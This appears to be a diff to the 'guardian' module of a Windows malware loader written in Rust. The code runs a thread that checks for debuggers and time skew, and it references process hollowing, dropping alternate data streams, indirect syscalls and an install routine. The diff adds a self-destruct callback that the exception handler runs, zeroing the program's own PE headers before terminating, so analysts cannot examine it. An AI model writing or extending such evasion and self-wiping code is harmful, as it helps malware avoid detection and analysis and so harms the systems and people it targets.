@@ -16,7 +16,7 @@ use winapi::um::handleapi::CloseHandle;
 use winapi::um::debugapi::IsDebuggerPresent;
 use winapi::shared::minwindef::{DWORD, LPVOID};
 
-// ── Public type aliases ────────────────────────────────────────────────────
+// ── Public type aliases ─────────────────────────────────────────────────────────
 // These are pub so indirect_syscall.rs can reference crate::guardian::* for
 // the resolve_* return types without duplicating the signatures.
 
@@ -51,6 +51,7 @@ struct GuardState {
     fn_drop_ads: FnVoid,
     fn_install:  FnVoid,
     fn_hollow:   FnBool,
+    fn_destruct: FnVoid,   // called by VEH handler on unhandled exception
 }
 
 /// The guardian thread body. Runs in a loop checking for debugger / time skew.
@@ -82,18 +83,29 @@ unsafe extern "system" fn guardian_thread(param: LPVOID) -> DWORD {
     }
 }
 
-/// VEH handler: on any unhandled exception, zero PE headers and terminate.
+// VEH state — stored separately so the handler closure can reach fn_destruct
+// without owning the full GuardState box.
+static mut VEH_DESTRUCT: Option<FnVoid> = None;
+
+/// VEH handler: on any unhandled exception, call fn_destruct then terminate.
 unsafe extern "system" fn veh_handler(_ex: LPVOID) -> i32 {
-    let own_base: usize;
-    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
-    let own_base = (own_base & !0xFFFF) as *mut u8;
-    core::ptr::write_bytes(own_base, 0u8, 4096);
+    if let Some(f) = VEH_DESTRUCT {
+        f();
+    } else {
+        // Fallback: zero own PE headers inline if fn_destruct wasn't set
+        let own_base: usize;
+        core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
+        let own_base = (own_base & !0xFFFF) as *mut u8;
+        core::ptr::write_bytes(own_base, 0u8, 4096);
+    }
     winapi::um::processthreadsapi::TerminateProcess(GetCurrentProcess(), 1);
     0 // EXCEPTION_CONTINUE_SEARCH — unreachable but required
 }
 
 /// Install a Vectored Exception Handler using the resolved fn ptr.
-pub unsafe fn install_veh(fn_add_veh: FnAddVeh) {
+/// `fn_destruct` will be called by the handler before terminating.
+pub unsafe fn install_veh(fn_add_veh: FnAddVeh, fn_destruct: FnVoid) {
+    VEH_DESTRUCT = Some(fn_destruct);
     (fn_add_veh)(1, veh_handler as *const u8);
 }
 
@@ -108,6 +120,10 @@ pub unsafe fn start_thread(
     fn_install:  FnVoid,
     fn_hollow:   FnBool,
 ) {
+    // fn_destruct defaults to fn_wipe for the guardian's own use.
+    // The VEH-specific fn_destruct is set separately via install_veh().
+    let fn_destruct: FnVoid = fn_wipe;
+
     let state = Box::new(GuardState {
         fn_ntqsi,
         fn_sleep,
@@ -117,6 +133,7 @@ pub unsafe fn start_thread(
         fn_drop_ads,
         fn_install,
         fn_hollow,
+        fn_destruct,
     });
     let state_ptr = Box::into_raw(state) as LPVOID;
 
